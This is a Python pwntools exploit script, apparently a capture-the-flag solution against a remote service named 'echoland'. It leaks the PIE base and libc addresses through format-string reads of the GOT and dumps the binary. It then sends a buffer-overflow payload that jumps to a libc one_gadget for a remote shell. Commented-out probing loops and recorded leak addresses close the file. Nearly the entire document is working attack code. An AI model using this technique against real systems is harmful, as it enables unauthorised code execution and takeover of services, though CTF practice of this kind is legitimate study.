from pwn import *

#pie je enabled
#plan: leak pie-> calculate got offsets->leak libc trough got-> override exit@got with one_gadget-> get shell
payload_leak_libc = '|%9$s|AA' + p64(0x00601fa8)

p = remote('139.59.176.147',31607)
#p = process('./dump.raw')
#pid = gdb.attach(p, gdbscript = "")

def leak_pie():
    # 2 mesto
    string = '|%12$p|'
    p.sendlineafter('> ' ,string)
    res = p.recvline().split("|")[1]
    res = int(res,16)
    print "Leak: "+hex(res)
    print "Pie Base: " + hex(res & 0xfffffffff000)
    res = res & 0xfffffffff000
    elf_base = res - 0x1000
    return elf_base

def leak_got(got_potential_addr):

    
    string = "|%9$s|aa"+p64(got_potential_addr + 0xf98)
    p.sendlineafter('> ' ,string)
    res = p.recvline().split("|")[1]
    res = res.replace('\n','')
    res = u64(res.ljust(8,'\0'))
    #print hex(got_potential_addr+0xfb0)
    print "hit: " +hex(got_potential_addr+0xf98) +' -> ' +hex(res)
    libc_base = res - 0x080aa0
    print "libc base: "+ hex(libc_base)

    return libc_base

    # for i in range(0x500,0x1000,8):
    #     string = "|%9$s|aa"+p64(got_potential_addr + i)
    #     p.sendlineafter('> ' ,string)
    #     res = p.recvline().split("|")[1]
    #     if not (len(res) < 6 or len(res) > 8):
    #         res = res.replace('\n','')
    #         print "hit: " +hex(got_potential_addr+i) +' -> ' +hex(u64(res.ljust(8,'\0'))) + ' used i: '+ str(i)
def test():
    start = 0x561c130d7000

    while True:
        print start & 0x0000000000ff 
        if start & 0x0000000000ff == 110:
            print hex(start)
        start +=1


def leak_bin(elf_base):
    elf_base = elf_base +0x341f
    while True:
        with open("dump.raw",'a') as f:
            string = "|%9$s|aa"+p64(elf_base)

            p.sendlineafter('> ' ,string)
            res = p.recv(100)
            print res
            print hex(elf_base)
            res = res.split("|")[1]+'\0'
            elf_base += len(res)
            f.write(res)
            if elf_base & 0x0000000000ff == 110:
                elf_base+=1
                f.write('\0')

def BOF(gadget):
    padding = "\0" * 0x48
    payload = padding
    payload += p64(gadget)
    payload += '\0' * (0x96 - len(payload))


    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', payload)

# for elem in range(0,256,8):
#     p = remote('206.189.121.131',32390)
#     string = '|%9$s|AA'+p64(0x00601f90+elem)
#     p.sendlineafter('> ',string)
#     res = p.recvline()
#     if not "./echoland" in res:
#         res = res.split("|")[1]
#     print res
#     print ""
#     p.close()
#     p.shutdown()

# for elem in range(10,50):
#     string = '|%12$s|'
#     p.sendlineafter('> ',string)
#     res = u64(p.recv(8))   
#     #if not "./echoland" in res:
#      #   res = res.split("|")[1]
#     print hex(res)
#     print "spot "+str(elem)
#     #print len(res)
# #    p.close()
#  #   p.shutdown()
# #p.sendlineafter('> ',payload_leak_libc)
# #print "trash: " + p.recvline()



def exploit():
    elf_base = leak_pie()
    #leak_bin(elf_base)
    got_potential = elf_base+ 0x3000
    libc = leak_got(got_potential)
    one_gadget = libc + 0x4f3d5
    one_gadget2 = libc + 0x4f432
    one_gadget3 = libc + 0x10a41c
    BOF(one_gadget2)
    #info block 

    print "gadgets:\n"
    print hex(one_gadget) + '\n'
    print hex(one_gadget2) + '\n'
    print hex(one_gadget3) + '\n'

    p.interactive()
exploit()
# leak: 0x55b103da3400
# res: 0x55b103da3000
# GOT potential: 0x55b103da5000

# hit: 0x55b103da5fb0 -> 0x7fe47b8f4aa0 -> puts
# hit: 0x55b103da5fb8 -> 0x7fe47ba01ee0 -> ?
# hit: 0x55b103da5fc0 -> 0x7fe47b8d8f70 -> printf
# hit: 0x55b103da5fd0 -> 0x7fe47b984140 -> read
# hit: 0x55b103da5fd8 -> 0x7fe47b91dc50 -> ?
# hit: 0x55b103da5fe0 -> 0x7fe47b8f53d0 -> setvbuf
# hit: 0x55b103da5ff8 -> 0x7fe47b895b10 -> libc_start_main
